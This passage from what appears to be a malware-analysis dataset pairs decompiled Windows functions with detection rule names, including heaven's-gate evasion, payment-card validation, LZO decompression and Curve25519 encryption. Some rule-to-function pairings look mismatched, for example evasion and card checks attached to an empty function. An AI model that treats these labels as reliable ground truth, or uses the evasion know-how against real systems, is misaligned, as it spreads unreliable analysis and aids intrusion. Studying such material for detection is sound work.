        "decompiled_code": "\nuint fcn.0044cc64(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar7 = 0;\n    piVar4 = fcn.0044cba8();\n    if (piVar4 == NULL) {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            cVar3 = fcn.004033e4();\n            if (cVar3 != '\\0') {\n                fcn.0044bc7c();\n            }\n        }\n    }\n    else {\n        if ((*(piVar4 + 7) & 0x10) == 0) {\n            fcn.0044bc7c();\n        }\n        (**(*piVar4 + 0x44))();\n        uVar5 = fcn.0044c314();\n        uVar2 = fcn.0044c810();\n        if ((uVar5 | uVar2) != 0) {\n            fcn.00449bb8();\n        }\n        uVar1 = *(**0x462098 + 0x44);\n        uVar5 = uVar5 & 0xffffff00;\n        if (((uVar1 != 0) && (uVar5 = uVar1,  *(uVar1 + 0x22f) == '\\x02')) && (piVar4 == *(uVar1 + 600))) {\n            iVar6 = sub.user32.dll_SendMessageA(*(uVar1 + 0x254), 0x234, 0, 0);\n            if (iVar6 != 0) {\n                uVar7 = fcn.0043fd08();\n                sub.user32.dll_DrawMenuBar(uVar7);\n            }\n        }\n        uVar7 = CONCAT31(uVar5 >> 8, 1);\n    }\n    return uVar7;\n}\n",
        "token_count": 451
    },
    "00452f08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00452f08(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.004533e4();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00453430();\n            if (*(iVar2 + 0x22b) == '\\x02') {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 124
    },
    "004539bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.004539bc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0xff000005;\n    if (*(in_EAX + 0x22f) == '\\x02') {\n        uVar1 = 0xff00000c;\n    }\n    return uVar1;\n}\n",
        "token_count": 77
    },
    "00403674": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403674(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "00403a90": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.00403a90(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = param_1;\n    (*(param_2 + 5))();\n    return;\n}\n",
        "token_count": 54
    },
    "004163cc": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004163cc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x416443;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00405648();\n    if (param_2 != 0) {\n        iVar2 = fcn.004108c8();\n        fcn.00405648(iVar2 + 5);\n        cVar1 = fcn.0040cf50();\n        if (cVar1 == '\\0') {\n            fcn.00405648();\n        }\n    }\n    fcn.00410fb8();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41644a;\n    uStack24 = 0x416442;\n    fcn.00405648();\n    return;\n}\n",
        "token_count": 250
    },
    "0041a5a4": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041a5a4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 52
    },
    "00442efc": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442efc(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 0x14) + 0x5b) - 1U < 2) {\n        fcn.00442e1c(&stack0xfffffffc);\n        fcn.00442e74(*(arg_8h + 0xc) + -2, &stack0xfffffffc);\n        fcn.00442e74(*(arg_8h + 0xc) + -2, &stack0xfffffffc);\n    }\n    else {\n        fcn.00442e1c(&stack0xfffffffc);\n        fcn.00442e74(*(arg_8h + 4) + 5, &stack0xfffffffc);\n        fcn.00442e74(*(arg_8h + 4) + 8, &stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "00401c34": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401c34(uint param_1, uint32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *in_EAX;\n    \n    puVar1 = (param_2 - 4) + in_EAX;\n    if (0xf < param_2) {\n        *puVar1 = 0x80000007;\n        fcn.00401e08();\n        return;\n    }\n    if (3 < param_2) {\n        *in_EAX = param_2 | 0x80000002;\n        *puVar1 = param_2 | 0x80000002;\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00401c64": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00401c64(void)\n\n{\n    int32_t in_EAX;\n    \n    *0x4635b0 = *0x4635b0 + 1;\n    *0x4635b4 = *0x4635b4 + ((*(in_EAX + -4) & 0x7ffffffc) - 4);\n    fcn.00402278();\n    return;\n}\n",
        "token_count": 91
    },
    "00401d58": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t fcn.00401d58(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uStack28;\n    int32_t iStack27;\n    int32_t iStack23;\n    \n    uStack28 = 0;\n    uVar1 = fcn.00401c04();\n    uVar2 = uVar1;\n    if (uVar1 != 0) {\n        if (in_EAX - *(uVar1 + 8) < 0xc) {\n            uVar2 = fcn.00401970();\n        }\n        else {\n            uVar2 = fcn.00401970();\n        }\n        if (iStack27 != 0) {\n            fcn.00401c34();\n            if (iStack27 + iStack23 < *(uVar1 + 8) + *(uVar1 + 0xc)) {\n                fcn.00401c88();\n            }\n            uVar2 = fcn.00401480();\n            uStack28 = 1;\n        }\n    }\n    return uVar2 & 0xffffff00 | uStack28;\n}\n",
        "token_count": 257
    },
    "00401edc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00401edc(void)\n\n{\n    uint32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    int32_t iStack16;\n    \n    uStack28 = *in_EAX;\n    uStack24 = in_EAX[1];\n    fcn.00401e90();\n    fcn.00401410();\n    if (uStack20 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (uStack20 < uStack28) {\n            iVar2 = fcn.00401cb0();\n            uStack28 = uStack28 - iVar2;\n            uStack24 = uStack24 + iVar2;\n        }\n        if (uStack28 + uStack24 < uStack20 + iStack16) {\n            iVar2 = fcn.00401d20();\n            uStack24 = uStack24 + iVar2;\n        }\n        if (uStack20 + iStack16 == uStack28 + uStack24) {\n            fcn.00401c34();\n            uStack24 = uStack24 - 4;\n        }\n        *0x46361c = uStack28;\n        *0x463618 = uStack24;\n        uVar1 = CONCAT31(uStack24 >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 317
    },
    "00401ff4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t * fcn.00401ff4(void)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    uint32_t in_EAX;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    \n    while ((puVar1 = *0x463614,  puVar3 = *0x46360c,  (*0x46360c)[2] < in_EAX &&\n           (uVar4 = (*0x463614)[2],  puVar3 = *0x463614,  uVar4 < in_EAX))) {\n        (*0x463614)[2] = in_EAX;\n        puVar3 = puVar1;\n        do {\n            puVar3 = puVar3[1];\n        } while (puVar3[2] < in_EAX);\n        (*0x463614)[2] = uVar4;\n        puVar1 = puVar3;\n        if ((puVar3 != *0x463614) ||\n           ((in_EAX < 0x1001 && (puVar3 = fcn.00401fc8(),  puVar1 = *0x463614,  puVar3 != NULL)))) break;\n        cVar2 = fcn.00401f68();\n        puVar3 = *0x46361c;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        if (in_EAX <= *0x463618) {\n            *0x463618 = *0x463618 - in_EAX;\n            if (*0x463618 < 0xc) {\n                in_EAX = in_EAX + *0x463618;\n                *0x463618 = 0;\n            }\n            *0x46361c = *0x46361c + in_EAX;\n            *puVar3 = in_EAX | 2;\n            *0x4635b0 = *0x4635b0 + 1;\n            *0x4635b4 = *0x4635b4 + (in_EAX - 4);\n            return puVar3 + 1;\n        }\n    }\n    *0x463614 = puVar1;\n    fcn.00401ba0();\n    uVar4 = puVar3[2];\n    if (uVar4 - in_EAX < 0xc) {\n        if (puVar3 == *0x463614) {\n            *0x463614 = puVar3[1];\n        }\n        *(puVar3 + uVar4) = *(puVar3 + uVar4) & 0xfffffffe;\n    }\n    else {\n        fcn.00401e08();\n        uVar4 = in_EAX;\n    }\n    *puVar3 = uVar4 | 2;\n    *0x4635b0 = *0x4635b0 + 1;\n    *0x4635b4 = *0x4635b4 + (uVar4 - 4);\n    return puVar3 + 1;\n}\n",
        "token_count": 663
    },
    "0040241c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040241c(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    uint uVar4;\n    uint32_t *puVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uStack24;\n    int32_t iStack20;\n    \n    uVar7 = param_2 + 7U & 0xfffffffc;\n    if (uVar7 < 0xc) {\n        uVar7 = 0xc;\n    }\n    puVar6 = in_EAX + -4;\n    uVar9 = *puVar6 & 0x7ffffffc;\n    puVar3 = puVar6 + uVar9;\n    if (uVar9 == uVar7) {\n        uVar4 = CONCAT31(puVar3 >> 8, 1);\n    }\n    else {\n        uVar8 = uVar7;\n        if (uVar7 < uVar9) {\n            uStack24 = uVar9 - uVar7;\n            if (puVar3 == *0x46361c) {\n                *0x46361c = *0x46361c + -uStack24;\n                *0x463618 = *0x463618 + uStack24;\n                if (*0x463618 < 0xc) {\n                    *0x46361c = *0x46361c + uStack24;\n                    *0x463618 = *0x463618 - uStack24;\n                    uVar8 = uVar9;\n                }\n            }\n            else {\n                if ((*puVar3 & 2) == 0) {\n                    uStack24 = uStack24 + *(puVar3 + 8);\n                    fcn.00401ba0();\n                }\n                uVar8 = uVar9;\n                if (0xb < uStack24) {\n                    *(puVar6 + uVar7) = uStack24 | 2;\n                    fcn.00401c64();\n                    uVar8 = uVar7;\n                }\n            }\ncode_r0x004025d6:\n            *0x4635b4 = *0x4635b4 + (uVar8 - uVar9);\n            uVar7 = *puVar6;\n            *puVar6 = uVar8 | uVar7 & 0x80000003;\n            uVar4 = CONCAT31((uVar7 & 0x80000003) >> 8, 1);\n        }\n        else {\n            do {\n                iStack20 = uVar7 - uVar9;\n                if (puVar6 + uVar9 == *0x46361c) {\n                    if (iStack20 <= *0x463618) {\n                        *0x463618 = *0x463618 - iStack20;\n                        *0x46361c = *0x46361c + iStack20;\n                        if (*0x463618 < 0xc) {\n                            *0x46361c = *0x46361c + *0x463618;\n                            uVar7 = uVar7 + *0x463618;\n                            *0x463618 = 0;\n                        }\n                        *0x4635b4 = *0x4635b4 + (uVar7 - uVar9);\n                        uVar9 = *puVar6;\n                        *puVar6 = uVar7 | uVar9 & 0x80000003;\n                        uVar4 = CONCAT31((uVar9 & 0x80000003) >> 8, 1);\n                        goto code_r0x004025ef;\n                    }\n                    fcn.00401e90();\n                }\n                puVar5 = puVar6 + uVar9;\n                if ((*puVar5 & 2) == 0) {\n                    uVar1 = puVar5[2];\n                    if (iStack20 <= uVar1) {\n                        fcn.00401ba0();\n                        if (uVar1 - iStack20 < 0xc) {\n                            uVar8 = uVar7 + (uVar1 - iStack20);\n                            puVar5 = puVar6 + uVar8;\n                            *puVar5 = *puVar5 & 0xfffffffe;\n                        }\n                        else {\n                            fcn.00401e08();\n                        }\n                        goto code_r0x004025d6;\n                    }\n                    puVar5 = puVar5 + uVar1;\n                    iStack20 = iStack20 - uVar1;\n                }\n            } while (((*puVar5 & 0x80000000) != 0) && (cVar2 = fcn.00401f94(),  cVar2 != '\\0'));\n            uVar4 = 0;\n        }\n    }\ncode_r0x004025ef:\n    return CONCAT44(iStack20, uVar4);\n}\n",
        "token_count": 1096
    },
    "00407da0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00407da0(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    uVar3 = 0;\n    iVar2 = fcn.00404268();\n    if ((iVar2 != 0) && (((cVar1 = *in_EAX,  cVar1 + 0xbfU < 0x1a || (cVar1 == '_')) || (cVar1 + 0x9fU < 0x1a)))) {\n        iVar2 = fcn.00404268();\n        if (1 < iVar2) {\n            iVar2 = iVar2 + -1;\n            iVar4 = 2;\n            do {\n                cVar1 = in_EAX[iVar4 + -1];\n                if (((9 < cVar1 - 0x30U) && (0x19 < cVar1 + 0xbfU)) && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))) {\n                    return 0;\n                }\n                iVar4 = iVar4 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 293
    },
    "00407ea4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407ea4(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cStack8;\n    \n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cStack8 = ROUND(fVar6);\n        uVar2 = cStack8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cStack8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 422
    },
    "004087f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004087f0(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -4) + -4;\n}\n",
        "token_count": 38
    },
    "00408828": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00408828(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.004026dc();\n    }\n    return;\n}\n",
        "token_count": 45
    },
    "0040b0b4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040b0b4(void)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack44 = 0x40b27e;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar5 = 1;\n    fcn.00403fa8();\n    arg_8h = &fcn.0040b0b4::var_8h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040ad7c(arg_8h);\n    iVar3 = fcn.00407fc8();\n    if (iVar3 - 3U < 3) {\n        while (iVar3 = fcn.00404268(),  iVar5 <= iVar3) {\n            uVar4 = *(in_EAX + -1 + iVar5);\n            if ((*((uVar4 >> 3) + 0x46110c) >> (uVar4 & 7) & 1) == 0) {\n                iVar3 = fcn.0040871c();\n                if (iVar3 == 0) {\n                    fcn.00404270();\n                    iVar5 = iVar5 + 1;\n                }\n                else {\n                    iVar3 = fcn.0040871c();\n                    if (iVar3 == 0) {\n                        fcn.00404270();\n                        iVar5 = iVar5 + 3;\n                    }\n                    else {\n                        iVar3 = fcn.0040871c();\n                        if (iVar3 == 0) {\n                            fcn.00404270();\n                            iVar5 = iVar5 + 1;\n                        }\n                        else {\n                            cVar1 = *(in_EAX + -1 + iVar5);\n                            if ((cVar1 == 'Y') || (cVar1 == 'y')) {\n                                fcn.00404270();\n                            }\n                            else {\n                                fcn.00404190();\n                                fcn.00404270();\n                            }\n                        }\n                    }\n                }\n                iVar5 = iVar5 + 1;\n            }\n            else {\n                var_4h = fcn.0040c124();\n                arg_8h = &fcn.0040b0b4::var_10h;\n                fcn.004044c8();\n                fcn.00404270();\n                iVar5 = iVar5 + var_4h;\n            }\n        }\n    }\n    else {\n        if ((*0x463744 == 4) || (*0x463744 - 0x11U < 2)) {\n            bVar2 = true;\n        }\n        else {\n            bVar2 = false;\n        }\n        if (bVar2) {\n            for (; iVar3 = fcn.00404268(),  iVar5 <= iVar3; iVar5 = iVar5 + 1) {\n                cVar1 = *(in_EAX + -1 + iVar5);\n                if ((cVar1 != 'G') && (cVar1 != 'g')) {\n                    fcn.00404190();\n                    fcn.00404270();\n                }\n            }\n        }\n        else {\n            fcn.00403ffc();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack44 = 0x40b285;\n    iStack48 = 0x40b27d;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 877
    },
    "0041dd6c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0041dd6c(void)\n\n{\n    int16_t in_AX;\n    \n    if (((in_AX != 1) && (in_AX != 4)) && (in_AX != 8)) {\n        return 0;\n    }\n    return 1 << (in_AX & 0x1f);\n}\n",
        "token_count": 72
    },
    "004330ec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004330ec(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 6) == 0) {\n        (**(*in_EAX + 0xcc))();\n        return;\n    }\n    if (*(param_2 + 6) == 5) {\n        fcn.00403454();\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00440dc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440dc0(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.004506c0();\n    if (iVar1 == 0) {\n        return;\n    }\n    if (param_2 != 9) {\n        if (param_2 == 0x12) {\n            uVar2 = 0;\n            fcn.004068fc();\n            fcn.0043a6d4(uVar2);\n            return;\n        }\n        if (3 < param_2 - 0x25U) {\n            return;\n        }\n    }\n    uVar2 = 0;\n    fcn.004068fc();\n    fcn.0043a6d4(uVar2);\n    return;\n}\n",
        "token_count": 181
    },
    "00409940": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409940(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    \n    ppcVar2 = arg_8h + -4;\n    pcVar1 = *ppcVar2;\n    while (**ppcVar2 == *(arg_8h + -5)) {\n        *ppcVar2 = *ppcVar2 + 1;\n    }\n    *(arg_8h + -0xc) = *ppcVar2 + (1 - pcVar1);\n    return;\n}\n",
        "token_count": 125
    },
    "00416fb0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416fb0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.00419b40();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00419b14();\n            if ((*(iVar2 + 0x24) & 4) != 0) {\n                iVar2 = fcn.00404da0();\n                fcn.00404f5c(iVar2 + 1);\n                uVar3 = fcn.00419b14();\n                iVar2 = fcn.00404da0();\n                *(*(arg_8h + -4) + -4 + iVar2 * 4) = uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "00418848": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418848(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.00416a48();\n        if (cVar1 != '\\0') break;\n        fcn.004188fc();\n    }\n    fcn.004179b4();\n    return;\n}\n",
        "token_count": 78
    },
    "004188a0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004188a0(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.00416a48();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.00416d8c();\n        if (cVar1 - 2U < 3) {\n            fcn.004188fc();\n        }\n        fcn.00418cf4();\n        while( true ) {\n            cVar1 = fcn.00416a48();\n            if (cVar1 != '\\0') break;\n            fcn.00418a98();\n        }\n        fcn.004179b4();\n    }\n    fcn.004179b4();\n    return;\n}\n",
        "token_count": 170
    },
    "0043b308": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b308(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00412708();\n    fcn.00439044();\n    iVar1 = *(*(arg_8h + -8) + 8);\n    fcn.00412758(&var_20h, \n                 ((*(iVar1 + 0x50) - *(iVar1 + 0x48)) + *(*(*(arg_8h + -4) + 0x30) + 0x4c)) - *(*(arg_8h + -4) + 0x4c));\n    fcn.00438eec();\n    return;\n}\n",
        "token_count": 179
    },
    "0044c100": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044c100(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    \n    iVar1 = fcn.0040c214();\n    if (iVar1 != 0) {\n        fcn.00404508();\n    }\n    return unaff_EBX & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 88
    },
    "004513a0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004513a0(uint param_1, int32_t param_2)\n\n{\n    fcn.0043cb94();\n    *(param_2 + 0x24) = *(param_2 + 0x24) & 0xfffffffc;\n    return;\n}\n",
        "token_count": 65
    },
    "0040d5b0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d5b0(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40d60a;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00404230();\n        fcn.00407fe0();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40d611;\n    uStack20 = 0x40d609;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 197
    },
    "0040d61c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d61c(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40d676;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00404230();\n        fcn.0040948c();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40d67d;\n    uStack20 = 0x40d675;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 196
    },
    "0040d688": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d688(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40d6e2;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00404230();\n        fcn.00409460();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40d6e9;\n    uStack20 = 0x40d6e1;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 199
    },
    "0040d6f4": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d6f4(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40d74e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00404230();\n        fcn.0040aca4();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40d755;\n    uStack20 = 0x40d74d;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 198
    },
    "0040d760": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d760(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40d7ba;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.00404230();\n        fcn.004094b8();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x40d7c1;\n    uStack20 = 0x40d7b9;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 199
    },
    "00410cf8": {
        "rules": [
